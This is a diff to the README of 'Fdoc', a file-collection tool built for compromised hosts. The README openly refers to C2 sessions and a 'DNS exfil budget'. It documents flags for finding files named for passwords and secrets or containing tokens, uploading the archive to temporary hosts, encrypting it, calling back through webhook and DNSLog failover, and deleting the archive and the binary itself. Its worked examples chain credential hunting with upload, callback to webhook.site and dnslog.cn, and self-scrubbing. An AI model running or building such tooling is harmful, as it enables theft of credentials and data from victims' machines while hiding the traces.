@@ -1,8 +1,10 @@
 # Fdoc
 
-File collection utility: filter files on a host and pack them into `tar.gz`.
+File collection utility: filter files on a host and pack them into `.tgz` (tar.gz).
 
-Optional `-upload` embeds the companion `uploader` tool (auto backend selection + webhook/DNS callback) so the download link can be recovered even if the parent C2 session dies. Without `-upload`, packing stays local and does not open network connections.
+> 中文文档：[README.zh-CN.md](README.zh-CN.md)
+
+Optional `-upload` embeds the companion `uploader` tool (auto backend by archive size). Without `-webhook`/`-dns`, the download URL is printed locally (stdout). With `-webhook`/`-dns`, the link is also pushed back via failover callback even if the parent C2 session dies. Without `-upload`, packing stays local and does not open network connections.
 
 Static binaries for Linux, Windows, and macOS.
 
@@ -17,9 +19,10 @@ Static binaries for Linux, Windows, and macOS.
 - Stream while walking (no collect-then-compress memory spike)
 - `-size` measures only (disk + logical) and respects `-max` / `-max-file`
 - `-q` quiet / `-v` verbose
-- `-upload`: auto-select temp host by archive size, then callback
-- `-webhook` / `-dns`: HTTPS JSON callback with DNSLog failover
-- `-scrub`: after successful upload+callback, delete archive and self binary
+- `-upload`: auto-select temp host by archive size; print link locally (or remote callback if configured)
+- `-webhook` / `-dns`: optional HTTPS JSON + DNSLog failover (not dual-send)
+- `-scrub`: after successful upload (+ callback if configured), delete archive and self binary
+- `-encrypt`: encrypt stream before upload (requires `-upload` + `-key`)
 
 > Symlinks are skipped to avoid cycles and permission issues.
 
@@ -37,29 +40,32 @@ Static binaries for Linux, Windows, and macOS.
                   packing stops at the limit and KEEPS the partial archive (exit 2)
   -max-file string
                   skip a single file larger than this logical size (default 100MB; 0=off)
-  -o string       output path (default output_<timestamp>.tar.gz)
+  -o string       output path (default output_<timestamp>.tgz)
   -size           measure matched size only; does not pack; respects -max/-max-file
   -t string       only files modified on/after this local date, e.g. 2023-10-01
   -x string       comma-separated directories to skip (replaces defaults if set)
   -q              quiet mode
-  -v              verbose mode (print matched paths)
+  -v              verbose (matched paths + upload probe/retry details)
 
-  -upload         after packing, upload archive and callback (requires -webhook and/or -dns)
+  -upload         after packing, upload archive (auto backend); local link echo unless -webhook/-dns
   -b string       pin upload backend (default: auto probe+failover by archive size)
   -force          allow flaky/down upload backends
-  -webhook string HTTPS URL that accepts POST JSON (download url + metadata)
-  -dns string     DNSLog / callback base domain (failover if webhook fails)
-  -task-id string task id in callback (auto-generated if empty)
+  -webhook string optional HTTPS callback URL (POST JSON)
+  -dns string     optional DNSLog base (failover if webhook fails/unset)
+  -task-id string task id in callback (auto-generated if empty; with -webhook/-dns)
   -cb-timeout float
-                  webhook timeout seconds (default 15)
-  -scrub          after successful upload+callback, delete archive and self binary
-  -encrypt        encrypt stream before upload (requires -key)
+                  webhook timeout / DNS budget seconds (default 15)
+  -scrub          after successful upload (+ callback if any), delete archive and self
+  -encrypt        encrypt stream before upload (requires -upload and -key)
   -key string     encryption key for -encrypt (not the same as -k keyword)
 ```
 
 ### Upload + callback
 
-Flow: pack → auto upload by real archive size → HTTPS webhook → DNS failover → optional `-scrub`.
+Flow: pack → auto upload by archive size → **local link echo** and/or **failover callback** → optional `-scrub`.
+
+- **No `-webhook` / `-dns`**: print `UPLOAD_OK ...` on stderr and the bare download URL on stdout (script-friendly).
+- **With `-webhook` / `-dns`**: failover callback (HTTPS webhook first; DNS only if webhook fails or is unset). Not dual-send.
 
 `-webhook` example values:
 
@@ -78,13 +84,15 @@ Webhook body (`Content-Type: application/json`):
   "host": "HOSTNAME",
   "url": "https://temp.sh/....",
   "backend": "temp",
-  "archive": "/tmp/x.tar.gz",
+  "archive": "x.tgz",
   "size": 1234567,
   "files": 42,
   "truncated": false,
   "ts": 1710000000
 }
 ```
+
+`archive` is the **basename** only (no absolute path). `host` has `|` stripped so DNS wire format stays unambiguous.
 
 DNS failover queries (best-effort):
 
@@ -118,11 +126,39 @@ Example input line:
 
 Requires all chunks `0`..`total-1` for the same `task_id`. Missing a chunk exits with an error.
 
-Runtime DNS callback also requires **every** chunk query to leave the host (NXDOMAIN counts; per-chunk timeout does not). Partial DNS success is treated as callback failure.
+Runtime DNS callback also requires **every** chunk query to leave the host (NXDOMAIN counts; per-chunk timeout does not). Partial DNS success is treated as callback failure. `-cb-timeout` is both the webhook timeout and the **total DNS exfil budget**.
 
-`-scrub` requires `-upload`, and runs only after a fully successful callback (webhook 2xx, or all DNS chunks sent). `-webhook` must be `https://` (or `http://` to loopback for local tests). Omit `-scrub` to keep the archive and binary.
+**Scrub trust model**: `-scrub` runs after a successful upload; if `-webhook`/`-dns` were set, also requires a successful callback (webhook 2xx **or** all DNS chunk queries sent). That does **not** verify your receiver stored the URL. Prefer webhook for C2-independent recovery; be cautious with DNS-only + `-scrub`. Windows self-delete may need admin (logs `SCRUB_PARTIAL` on failure).
+
+`-scrub` / `-encrypt` require `-upload`. `-webhook` must be `https://` (or `http://` to loopback for local tests). Omit `-scrub` to keep the archive and binary.
 
 On Unix, `-upload` ignores `SIGHUP` so a dead parent session is less likely to kill the process mid-flight.
+
+### Encryption format & decrypt
+
+`-upload -encrypt -key SECRET` uses the same format as uploader:
+
+```text
+[UP01 4-byte magic][random IV 16 bytes][AES-256-CBC ciphertext, PKCS7 padded]
+```
+
+- Key: PKCS7-pad `SECRET` to **32 bytes** → AES-256 key (not PBKDF2)
+- Remote filename stays `*.tgz` (or `*.tar.gz` → `*.tgz`) for host friendliness, but the **bytes are ciphertext**, not a gzip archive
+- On success stderr shows `ENCRYPT_OK plain=… cipher=… decrypt_first=1 …` — **always run `Fdoc decrypt` before** `tar` / `gunzip`
+- Check with `xxd`: header should be `55 50 30 31` (`UP01`); `1f 8b` means plaintext gzip (not encrypted)
+- Downloaded size should match `ENCRYPT_OK cipher=`
+- **Disk**: `-encrypt` writes a temporary ciphertext beside the archive (same directory, not `/tmp`), so you need about **1× archive size** free on that volume for the duration of the upload. `Fdoc decrypt` writes the full plaintext output (another ~1×) and streams decryption (no multi-GB RAM spike). `-q` only silences human logs; machine lines (`UPLOAD_OK` / `ENCRYPT_OK` / `DECRYPT_OK`) still print.
+
+Decrypt with Fdoc (required before treating the download as an archive; no uploader binary needed):
+
+```shell
+Fdoc decrypt -key 'SECRET' -o recovered.tgz downloaded.tgz
+# default -o: name.tgz; if input is already *.tgz → name.dec.tgz (never overwrites input)
+# use -force to overwrite an existing output
+tar -tzf recovered.tgz
+```
+
+Compatible with `uploader decrypt -k 'SECRET' -o recovered.tgz downloaded.tgz`.
 
 ### Filter logic
 
@@ -159,27 +195,31 @@ Exit codes: `0` ok, `1` error (including invalid `-max`/`-t` / upload/callback f
 ```shell
 # 1) Probe size, then pack
 Fdoc -d /data/docs -e documents -size
-Fdoc -d /data/docs -e documents -max 500MB -o docs.tar.gz
+Fdoc -d /data/docs -e documents -max 500MB -o docs.tgz
 
 # 2) Default home documents, quiet
-Fdoc -q -o docs.tar.gz
+Fdoc -q -o docs.tgz
 
 # 3) Filename / keyword hits
-Fdoc -d /data -f password,secret -e any -o hits.tar.gz
-Fdoc -d /data -e txt,ini,conf -k token:,password: -o hits.tar.gz
+Fdoc -d /data -f password,secret -e any -o hits.tgz
+Fdoc -d /data -e txt,ini,conf -k token:,password: -o hits.tgz
 
 # 4) Recent files
-Fdoc -d /data -e documents -t 2024-01-01 -o recent.tar.gz
+Fdoc -d /data -e documents -t 2024-01-01 -o recent.tgz
 
 # 5) Broader types / no extension filter
 Fdoc -e all -size
-Fdoc -e any -f config -max-file 0 -o cfg.tar.gz
+Fdoc -e any -f config -max-file 0 -o cfg.tgz
 
-# 6) Pack → auto upload → callback → scrub
-Fdoc -d /data -e documents -o /tmp/x.tar.gz -upload \
+# 6) Pack → upload (local echo) or remote callback → scrub
+Fdoc -d /data -e documents -o /tmp/x.tgz -upload -q
+Fdoc -d /data -e documents -o /tmp/x.tgz -upload \
   -webhook https://webhook.site/<uuid> \
   -dns xxx.dnslog.cn \
   -task-id op42 -scrub -q
+
+# Decrypt a downloaded ciphertext
+Fdoc decrypt -key 'secret' -o /tmp/recovered.tgz ~/Downloads/xxx.bin
 ```
 
 Run `Fdoc -h` for the same recipes inline with flag details.
@@ -213,6 +253,7 @@ pkg/                 walk / filter / pack / sighup
 pkg/compress/        tar.gz writer
 pkg/upload/          uploader route wrapper
 pkg/callback/        webhook + DNS callback
+pkg/decrypt/         decrypt subcommand (UP01 AES-CBC)
 pkg/scrub/           optional artifact cleanup
 scripts/             dnslog_decode.py, smoke_regress.sh
 third_party/uploader embedded uploader module (replace target)
